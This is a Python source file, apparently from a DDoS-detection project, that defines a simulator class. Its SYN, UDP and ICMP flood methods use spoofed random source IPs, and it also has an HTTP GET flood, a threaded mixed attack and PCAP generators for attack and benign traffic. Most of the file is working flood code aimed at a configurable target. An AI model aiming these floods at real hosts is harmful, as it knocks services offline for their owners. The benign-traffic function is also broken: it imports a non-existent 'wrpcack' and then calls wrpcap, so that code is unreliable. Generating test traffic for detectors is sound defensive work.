"""
DDoS attack simulator for testing and validation
"""

import socket
import threading
import time
import random
from scapy.all import IP, TCP, UDP, ICMP, send
from pathlib import Path
import logging
from typing import List, Optional

logger = logging.getLogger(__name__)


class DDoSSimulator:
    """Simulate various DDoS attack types"""
    
    def __init__(self, target_ip: str = "127.0.0.1", target_port: int = 80):
        """
        Initialize DDoS simulator
        
        Args:
            target_ip: Target IP address
            target_port: Target port
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.is_running = False
        self.threads = []
        
    def syn_flood(self, packet_count: int = 1000, duration: int = 30) -> None:
        """
        Simulate SYN flood attack
        
        Args:
            packet_count: Number of packets to send
            duration: Duration of attack in seconds
        """
        logger.info(f"Starting SYN flood attack on {self.target_ip}:{self.target_port}")
        self.is_running = True
        
        start_time = time.time()
        packets_sent = 0
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                # Randomize source IP and port
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                
                # Create SYN packet
                packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                    sport=src_port,
                    dport=self.target_port,
                    flags='S',
                    seq=random.randint(1000, 9000)
                )
                
                send(packet, verbose=False)
                packets_sent += 1
                
                if packets_sent >= packet_count:
                    break
                    
                time.sleep(0.01)  # Small delay to avoid overwhelming local system
                
            except Exception as e:
                logger.error(f"Error sending SYN packet: {e}")
        
        logger.info(f"SYN flood completed. Sent {packets_sent} packets")
    
    def udp_flood(self, packet_count: int = 1000, duration: int = 30) -> None:
        """
        Simulate UDP flood attack
        
        Args:
            packet_count: Number of packets to send
            duration: Duration of attack in seconds
        """
        logger.info(f"Starting UDP flood attack on {self.target_ip}:{self.target_port}")
        self.is_running = True
        
        start_time = time.time()
        packets_sent = 0
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                # Randomize source IP and port
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                
                # Create UDP packet with random payload
                payload = bytes([random.randint(0, 255) for _ in range(random.randint(64, 1400))])
                
                packet = IP(src=src_ip, dst=self.target_ip) / UDP(
                    sport=src_port,
                    dport=self.target_port
                ) / payload
                
                send(packet, verbose=False)
                packets_sent += 1
                
                if packets_sent >= packet_count:
                    break
                    
                time.sleep(0.01)
                
            except Exception as e:
                logger.error(f"Error sending UDP packet: {e}")
        
        logger.info(f"UDP flood completed. Sent {packets_sent} packets")
    
    def icmp_flood(self, packet_count: int = 1000, duration: int = 30) -> None:
        """
        Simulate ICMP flood attack (ping flood)
        
        Args:
            packet_count: Number of packets to send
            duration: Duration of attack in seconds
        """
        logger.info(f"Starting ICMP flood attack on {self.target_ip}")
        self.is_running = True
        
        start_time = time.time()
        packets_sent = 0
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                # Randomize source IP
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                # Create ICMP echo request packet
                packet = IP(src=src_ip, dst=self.target_ip) / ICMP()
                
                send(packet, verbose=False)
                packets_sent += 1
                
                if packets_sent >= packet_count:
                    break
                    
                time.sleep(0.01)
                
            except Exception as e:
                logger.error(f"Error sending ICMP packet: {e}")
        
        logger.info(f"ICMP flood completed. Sent {packets_sent} packets")
    
    def http_flood(self, packet_count: int = 500, duration: int = 30) -> None:
        """
        Simulate HTTP flood attack (layer 7)
        
        Args:
            packet_count: Number of requests to send
            duration: Duration of attack in seconds
        """
        logger.info(f"Starting HTTP flood attack on {self.target_ip}:{self.target_port}")
        self.is_running = True
        
        start_time = time.time()
        requests_sent = 0
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                # Create HTTP GET request
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                try:
                    sock.connect((self.target_ip, self.target_port))
                    http_request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n"
                    sock.send(http_request.encode())
                    requests_sent += 1
                except socket.error:
                    pass
                finally:
                    sock.close()
                
                if requests_sent >= packet_count:
                    break
                    
                time.sleep(0.1)
                
            except Exception as e:
                logger.error(f"Error sending HTTP request: {e}")
        
        logger.info(f"HTTP flood completed. Sent {requests_sent} requests")
    
    def mixed_attack(self, packet_count: int = 1000, duration: int = 30) -> None:
        """
        Simulate mixed DDoS attack (combination of multiple attack types)
        
        Args:
            packet_count: Total packets to send
            duration: Duration of attack in seconds
        """
        logger.info(f"Starting mixed DDoS attack on {self.target_ip}:{self.target_port}")
        self.is_running = True
        
        attack_types = ['syn_flood', 'udp_flood', 'icmp_flood']
        packets_per_type = packet_count // len(attack_types)
        
        threads = []
        
        for attack_type in attack_types:
            thread = threading.Thread(
                target=self._run_attack,
                args=(attack_type, packets_per_type, duration)
            )
            thread.start()
            threads.append(thread)
            time.sleep(1)  # Stagger attack starts
        
        for thread in threads:
            thread.join()
        
        logger.info("Mixed attack completed")
    
    def _run_attack(self, attack_type: str, packet_count: int, duration: int):
        """Helper method to run attack in thread"""
        if attack_type == 'syn_flood':
            self.syn_flood(packet_count, duration)
        elif attack_type == 'udp_flood':
            self.udp_flood(packet_count, duration)
        elif attack_type == 'icmp_flood':
            self.icmp_flood(packet_count, duration)
        elif attack_type == 'http_flood':
            self.http_flood(packet_count, duration)
    
    def stop_attack(self):
        """Stop the ongoing attack"""
        self.is_running = False
        logger.info("Attack stopped")
    
    def generate_attack_traffic(self, 
                               attack_type: str = 'syn_flood',
                               output_file: str = None,
                               packet_count: int = 1000) -> str:
        """
        Generate attack traffic and save to PCAP for analysis
        
        Args:
            attack_type: Type of attack to simulate
            output_file: Output PCAP file path
            packet_count: Number of packets to generate
            
        Returns:
            Path to the generated PCAP file
        """
        from scapy.all import wrpcap
        
        if output_file is None:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            output_file = f"./data/raw/attack_{attack_type}_{timestamp}.pcap"
        
        packets = []
        
        logger.info(f"Generating {attack_type} attack traffic")
        
        for i in range(packet_count):
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            src_port = random.randint(1024, 65535)
            
            if attack_type == 'syn_flood':
                packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                    sport=src_port,
                    dport=self.target_port,
                    flags='S',
                    seq=random.randint(1000, 9000)
                )
            elif attack_type == 'udp_flood':
                payload = bytes([random.randint(0, 255) for _ in range(random.randint(64, 1400))])
                packet = IP(src=src_ip, dst=self.target_ip) / UDP(
                    sport=src_port,
                    dport=self.target_port
                ) / payload
            elif attack_type == 'icmp_flood':
                packet = IP(src=src_ip, dst=self.target_ip) / ICMP()
            else:
                logger.warning(f"Unknown attack type: {attack_type}")
                break
            
            packets.append(packet)
        
        # Save to PCAP
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        wrpcap(str(output_path), packets)
        
        logger.info(f"Generated {len(packets)} packets saved to {output_path}")
        
        return str(output_path)
    
    def generate_normal_traffic(self,
                               output_file: str = None,
                               packet_count: int = 1000) -> str:
        """
        Generate normal (benign) traffic for comparison
        
        Args:
            output_file: Output PCAP file path
            packet_count: Number of packets to generate
            
        Returns:
            Path to the generated PCAP file
        """
        from scapy.all import wrpcack
        
        if output_file is None:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            output_file = f"./data/raw/normal_{timestamp}.pcap"
        
        packets = []
        
        logger.info(f"Generating normal traffic")
        
        # Simulate various normal protocols
        protocols = ['tcp', 'udp', 'icmp']
        
        for i in range(packet_count):
            protocol = random.choice(protocols)
            src_ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
            dst_ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
            
            if protocol == 'tcp':
                packet = IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=random.choice([80, 443, 22, 21]),
                    flags=random.choice(['A', 'PA', 'S', 'SA']),
                    seq=random.randint(1000, 9000)
                )
            elif protocol == 'udp':
                packet = IP(src=src_ip, dst=dst_ip) / UDP(
                    sport=random.randint(1024, 65535),
                    dport=random.choice([53, 67, 68, 123])
                )
            else:  # icmp
                packet = IP(src=src_ip, dst=dst_ip) / ICMP()
            
            packets.append(packet)
        
        # Save to PCAP
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        wrpcap(str(output_path), packets)
        
        logger.info(f"Generated {len(packets)} normal packets saved to {output_path}")
        
        return str(output_path)
